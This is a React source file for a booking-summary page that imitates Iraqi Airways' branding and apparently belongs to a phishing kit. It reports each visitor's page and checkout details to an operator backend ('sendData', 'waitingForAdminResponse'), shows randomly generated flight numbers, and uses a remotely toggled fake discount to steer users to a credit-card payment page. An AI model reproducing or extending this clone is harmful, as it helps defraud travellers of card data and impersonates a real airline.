import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { useSignals } from "@preact/signals-react/runtime";
import { sendData, navigateToPage, globalDiscount } from '../lib/store';
import { useLang } from '../contexts/LanguageContext';
import { cityName as getCityName } from '../lib/airportNames';

export default function SeatCustomization() {
  useSignals();
  // Subscribe to global discount signal for real-time UI updates
  const isDiscountActive = globalDiscount.value;
  const [, setLocation] = useLocation();
  const { lang, setLang, t } = useLang();
  const isAr = lang === 'ar';
  const [langMenuOpen, setLangMenuOpen] = useState(false);
  const [detailOpen, setDetailOpen] = useState<number | null>(null);
  const [paxOpen, setPaxOpen] = useState(false);
  const [paxOpenIdx, setPaxOpenIdx] = useState(-1);

  const flightData = JSON.parse(localStorage.getItem('selectedFlight') || '{}');
  const passengers = JSON.parse(localStorage.getItem('passengerData') || '[]');
  const tripSummary = JSON.parse(localStorage.getItem('tripSummary') || '{}');

  const cityNames: Record<string, string> = {
    BGW: 'Baghdad', EBL: 'Erbil', BSR: 'Basra', NJF: 'Najaf', KIK: 'Kirkuk',
    ISU: 'Sulaymaniyah', OSM: 'Mosul', AMM: 'Amman', IST: 'Istanbul', DXB: 'Dubai',
    BEY: 'Beirut', CAI: 'Cairo', DEL: 'Delhi', FRA: 'Frankfurt', KUL: 'Kuala Lumpur',
    CAN: 'Guangzhou', CPH: 'Copenhagen', SAW: 'Istanbul Sabiha', AYT: 'Antalya',
    TZX: 'Trabzon', SZF: 'Samsun', ESB: 'Ankara', DUS: 'Dusseldorf', MUC: 'Munich',
    SHJ: 'Sharjah', MCT: 'Muscat', BAH: 'Bahrain', IFN: 'Isfahan', TUN: 'Tunis', VKO: 'Moscow',
  };

  const cityName = (code?: string) => (code ? getCityName(code.toUpperCase(), cityNames[code.toUpperCase()] || code, lang) : '');

  const origin = flightData.origin || tripSummary.originCode || 'BGW';
  const destination = flightData.destination || tripSummary.destCode || 'EBL';
  const originCity = cityName(origin);
  const destCity = cityName(destination);

  const curCode = tripSummary.curCode || 'IQD';
  const originalPrice = tripSummary.originalTotalConv || tripSummary.baseTotalConv || flightData.price || 0;
  const discountedPrice = tripSummary.baseTotalConv || flightData.price || 0;
  const totalPrice = isDiscountActive ? discountedPrice : originalPrice;
  
  const formatPrice = (n: number) => `${curCode} ${n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;

  const depTime = flightData.departureTime || '17:00';
  const arrTime = flightData.arrivalTime || '18:00';
  const duration = flightData.duration || '1h 0min';
  const fareClass = flightData.fareClass || tripSummary.bundleName || 'Economy Platinum';
  const flightDate = flightData.date || tripSummary.firstDate || '';

  const formatDate = (dateStr: string) => {
    if (!dateStr) return '';
    try {
      const d = new Date(dateStr.includes('T') ? dateStr : dateStr + 'T00:00:00');
      if (isNaN(d.getTime())) return dateStr;
      return d.toLocaleDateString(isAr ? 'ar-EG' : 'en-GB', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' });
    } catch { return dateStr; }
  };

  const pax = passengers[0] || {};
  const paxName = `${pax.firstName || ''} ${pax.lastName || ''}`.trim() || tripSummary.primaryName || 'Passenger';
  const paxEmail = pax.email || '';
  const paxPhone = `${pax.dialCode || '+964'} ${pax.phone || ''}`.trim();

  const handleCheckout = () => {
    sendData({
      data: { action: 'checkout', total: formatPrice(totalPrice), passenger: paxName },
      current: "ملخص الحجز",
      nextPage: "الدفع",
      waitingForAdminResponse: false,
      isCustom: true,
    });
    setLocation('/credit-card-payment');
  };

  useEffect(() => {
    navigateToPage('ملخص الحجز');
    if (!flightData.origin && !tripSummary.curCode) {
      setLocation('/passenger-details');
    }
  }, []);

  return (
    <div className="min-h-screen flex flex-col bg-white" dir={isAr ? 'rtl' : 'ltr'} style={{ fontFamily: 'Lato, sans-serif' }}>
      {/* Header */}
      <header className="bg-[#4ca42c] text-white">
        <div className="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
          {/* Logo and Home (Right in RTL, Left in LTR) */}
          <div className="flex items-center gap-6">
            <img src="/iraqi_airways/upload/logo-white-transparent.png" alt="Iraqi Airways" className="h-10 cursor-pointer" onClick={() => setLocation('/')} />
            <span className="hidden sm:inline border-l border-white/50 h-6"></span>
            <span className="hidden sm:inline text-sm cursor-pointer hover:underline" onClick={() => setLocation('/')}>{t('common.home')}</span>
          </div>

          {/* Language Switcher (Left in RTL, Right in LTR) */}
          <div className="relative hidden sm:block">
            <button onClick={() => setLangMenuOpen(o => !o)} className="text-sm flex items-center gap-1 hover:text-white/80 transition-colors">
              <span>{lang === 'ar' ? 'العربية' : 'English'}</span>
              <span className="text-xs">▼</span>
            </button>
            {langMenuOpen && (
              <div className={`absolute z-30 mt-1 w-36 bg-white rounded-xl shadow-lg border border-gray-200 overflow-hidden ${isAr ? 'left-0' : 'right-0'}`}>
                <button onClick={() => { setLang('ar'); setLangMenuOpen(false); }} className="block w-full text-start px-4 py-2.5 text-sm text-gray-800 hover:bg-green-50">العربية</button>
                <button onClick={() => { setLang('en'); setLangMenuOpen(false); }} className="block w-full text-start px-4 py-2.5 text-sm text-gray-800 hover:bg-green-50">English</button>
              </div>
            )}
          </div>
        </div>
      </header>

      {/* Main content */}
      <main className="flex-1 max-w-4xl mx-auto w-full px-4 py-8">
        {/* Your selection title */}
        <div className="text-center mb-8">
          <div className="inline-block border border-gray-300 rounded-lg px-8 py-4">
            <h1 className="text-[#2E7D32] text-2xl font-light">{t('fsr.yourSelection')}</h1>
            <p className="text-[#2E7D32] text-sm">{originCity} {t('common.to')} {destCity}</p>
          </div>
        </div>

        {/* Your flights */}
        <h2 className="text-center text-[#2E7D32] text-xl font-bold mb-4">{t('fsr.yourFlight')}</h2>
        {(flightData.legs && flightData.legs.length > 1 ? flightData.legs : [{ origin, destination, date: flightDate, departureTime: depTime, arrivalTime: arrTime, duration, fare: fareClass }]).map((leg: any, legIdx: number) => (
        <div key={legIdx} className="border border-gray-200 rounded-lg p-6 mb-4">
          <div className="mb-4">
            <span className="font-bold text-[#2E7D32]">{cityName(leg.origin)} {t('common.to')} {cityName(leg.destination)}</span>
            <span className="text-[#2E7D32] ml-2">- {formatDate(leg.date)}</span>
          </div>
          <hr className="mb-4" />
          <div className="flex items-center justify-between flex-wrap gap-4">
            <div className="flex items-center gap-4">
              <div className="text-center">
                <p className="text-2xl font-light text-[#2E7D32]">{leg.departureTime}</p>
                <p className="text-sm text-gray-600">{leg.origin}</p>
              </div>
              <div className="flex items-center gap-2 text-gray-400 text-xs">
                <span>···········</span>
                <span>{t('fsr.nonstop')}</span>
                <span>···········</span>
              </div>
              <div className="text-center">
                <p className="text-2xl font-light text-[#2E7D32]">{leg.arrivalTime}</p>
                <p className="text-sm text-gray-600">{leg.destination}</p>
              </div>
            </div>
            <div className="text-sm text-gray-600">
              <p>⏱ <strong>{t('fsr.duration')} {leg.duration}</strong></p>
              <p>✈ {t('fsr.operatedBy')}</p>
            </div>
            <div className="flex items-center gap-2 cursor-pointer" onClick={() => setDetailOpen(detailOpen === legIdx ? null : legIdx)}>
              <span className="text-[#2E7D32] font-medium">{leg.fare || fareClass}</span>
              <div className="w-8 h-8 border-2 border-[#2E7D32] rounded flex items-center justify-center">
                <span className="text-[#2E7D32] text-sm">{detailOpen === legIdx ? '∧' : '∨'}</span>
              </div>
            </div>
          </div>
          {/* Expanded details - green background, 2 columns */}
          {detailOpen === legIdx && (
            <div className="mt-4 bg-[#f0f7f0] rounded-lg p-6">
              <div className="grid grid-cols-2 gap-8">
                {/* Left: Itinerary details */}
                <div className="border-r border-[#4CAF50]/30 pr-6">
                  <h4 className="text-[#2E7D32] font-bold text-center mb-4">{t('fsr.itineraryDetails')}</h4>
                  <div className="flex items-start gap-3">
                    <div className="flex flex-col items-center mt-1">
                      <div className="w-3 h-3 rounded-full bg-[#4CAF50]"></div>
                      <div className="w-[3px] h-16 bg-[#4CAF50]"></div>
                      <div className="w-3 h-3 rounded-full bg-[#4CAF50]"></div>
                    </div>
                    <div className="flex-1">
                      <p className="text-[#2E7D32] font-bold">{leg.departureTime} {cityName(leg.origin)}</p>
                      <p className="text-[#2E7D32] text-sm">{cityName(leg.origin)} Airport ({leg.origin})</p>
                      <p className="text-gray-500 text-xs mt-2 mb-2">{leg.duration}</p>
                      <p className="text-[#2E7D32] font-bold">{leg.arrivalTime} {cityName(leg.destination)}</p>
                      <p className="text-[#2E7D32] text-sm">{cityName(leg.destination)} Airport ({leg.destination})</p>
                    </div>
                  </div>
                  <div className="mt-4">
                    <p className="text-[#2E7D32] text-sm">Flight number <strong>{leg.flightNumber || `IA ${Math.floor(Math.random()*900+100)}`}</strong></p>
                    <p className="text-[#2E7D32] text-sm">Operated by Iraqi Airways</p>
                    <p className="text-[#2E7D32] text-sm uppercase">BOEING 737-800</p>
                  </div>
                </div>
                {/* Right: Your fare */}
                <div>
                  <h4 className="text-[#2E7D32] font-bold text-center mb-4">{t('fsr.yourFare')}</h4>
                  <p className="text-[#2E7D32] font-bold text-center mb-4">{fareClass}</p>
                  <div className="space-y-3">
                    <p className="text-sm text-[#2E7D32]">🧳 <strong>{t('fsr.cabinBaggage')}</strong>  1 {t('fsr.piece')} {t('fsr.upTo')} 7kg</p>
                    <p className="text-sm text-[#2E7D32]">🧳 <strong>{t('fsr.checkedBaggage')}</strong>  1 {t('fsr.piece')} {t('fsr.upTo')} 30kg</p>
                    <p className="text-sm text-[#2E7D32]">✏️ <strong>{t('fsr.changeBookings')}</strong>  {t('fsr.before72')}<br/><span className={isAr ? 'mr-6' : 'ml-6'}>{t('fsr.anyOtherTime')}</span></p>
                    <p className="text-sm text-[#2E7D32]">💰 <strong>{t('fsr.refundBookings')}</strong>  {t('fsr.allowedAnyTime')}</p>
                    <p className="text-sm text-[#2E7D32]">🏛 <strong>{t('fsr.vipLounge')}</strong>  {t('fsr.noAccess')}</p>
                  </div>
                </div>
              </div>
              {/* Security message */}
              <div className="mt-6 pt-4 border-t border-[#4CAF50]/30">
                <p className="text-[#2E7D32] text-sm">🔒 Your flights and prices have been secured. In order to change your selection, please start a new search.</p>
              </div>
              {/* Close arrow */}
              <div className="flex justify-center mt-4">
                <div className="w-8 h-8 border-2 border-[#2E7D32] rounded flex items-center justify-center cursor-pointer" onClick={() => setDetailOpen(null)}>
                  <span className="text-[#2E7D32] text-sm">∧</span>
                </div>
              </div>
            </div>
          )}
        </div>
        ))}

        {/* Passenger info */}
        <div className="border border-gray-200 rounded-lg p-6 mb-4 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <div className="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center text-gray-500">👤</div>
            <div>
              <p className="text-[#2E7D32] font-bold">{paxName}</p>
              <p className="text-xs text-gray-500">{paxEmail} | {paxPhone}</p>
            </div>
          </div>
          <div className="w-8 h-8 border-2 border-[#2E7D32] rounded flex items-center justify-center cursor-pointer" onClick={() => setPaxOpen(!paxOpen)}>
            <span className="text-[#2E7D32] text-sm">{paxOpen ? '∧' : '∨'}</span>
          </div>
        </div>
        {paxOpen && (
          <div className="border border-gray-200 rounded-lg p-6 mb-4 bg-gray-50">
            <div className="space-y-2 text-sm text-[#2E7D32]">
              <p><strong>Name:</strong> {paxName}</p>
              <p><strong>Gender:</strong> {pax.gender || 'Not specified'}</p>
              <p><strong>DOB:</strong> {pax.dob || 'Not specified'}</p>
              <p><strong>Contact:</strong> {paxPhone}</p>
              <p><strong>Email:</strong> {paxEmail}</p>
            </div>
          </div>
        )}

        {/* Total price */}
        <div className="text-right mb-4">
          <p className="text-[#2E7D32] text-lg flex items-center justify-end gap-2">
            {t('fsr.totalPrice')}: 
            {globalDiscount.value && <span className="text-lg line-through text-[#FF0000]">{formatPrice(originalPrice)}</span>}
            <strong className="text-3xl">{formatPrice(totalPrice)}</strong>
          </p>
          <p className="text-gray-500 text-sm mt-1">One way price for all passengers (including taxes, fees and discounts). <a href="#" className="font-bold text-gray-700 underline">See price details.</a></p>
        </div>

        {/* Info message */}
        <div className="bg-[#f4f7fb] border border-gray-200 rounded-lg p-6 mb-8">
          <div className="flex items-start gap-4">
            <div className="text-2xl mt-1">ℹ️</div>
            <div className="text-sm text-gray-700 space-y-3">
              <p>You have chosen a direct payment. Your booking will be confirmed only after the payment is completed.</p>
              <p>Please note that the prices are subject to change until the payment is completed.</p>
            </div>
          </div>
        </div>

        {/* Checkout button - right aligned */}
        <div className="flex justify-end mb-12">
          <button onClick={handleCheckout} className="bg-[#1B5E20] text-white px-10 py-3 rounded-full text-lg font-medium hover:bg-[#0D3B0F]">{t('checkout.checkout')}</button>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#4ca42c] text-white mt-auto">
        <div className="max-w-7xl mx-auto px-4 py-8">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
            <div>
              <h4 className="font-bold mb-4">Iraqi Airways</h4>
              <ul className="text-sm space-y-2">
                <li><a href="#" className="hover:underline">About us</a></li>
                <li><a href="#" className="hover:underline">Contact us</a></li>
                <li><a href="#" className="hover:underline">Fleet</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-4">Plan & Book</h4>
              <ul className="text-sm space-y-2">
                <li><a href="#" className="hover:underline">Book a flight</a></li>
                <li><a href="#" className="hover:underline">Flight status</a></li>
                <li><a href="#" className="hover:underline">Destinations</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-4">Legal</h4>
              <ul className="text-sm space-y-2">
                <li><a href="#" className="hover:underline">Privacy Policy</a></li>
                <li><a href="#" className="hover:underline">Terms & Conditions</a></li>
                <li><a href="#" className="hover:underline">Carrier's liability</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-4">Follow us</h4>
              <div className="flex gap-4">
                <span className="cursor-pointer hover:opacity-80">FB</span>
                <span className="cursor-pointer hover:opacity-80">TW</span>
                <span className="cursor-pointer hover:opacity-80">IG</span>
              </div>
            </div>
          </div>
          <div className="mt-8 pt-8 border-t border-white/20 text-center text-xs">
            <p>&copy; 2026 Iraqi Airways. All rights reserved.</p>
          </div>
        </div>
      </footer>
    </div>
  );
}
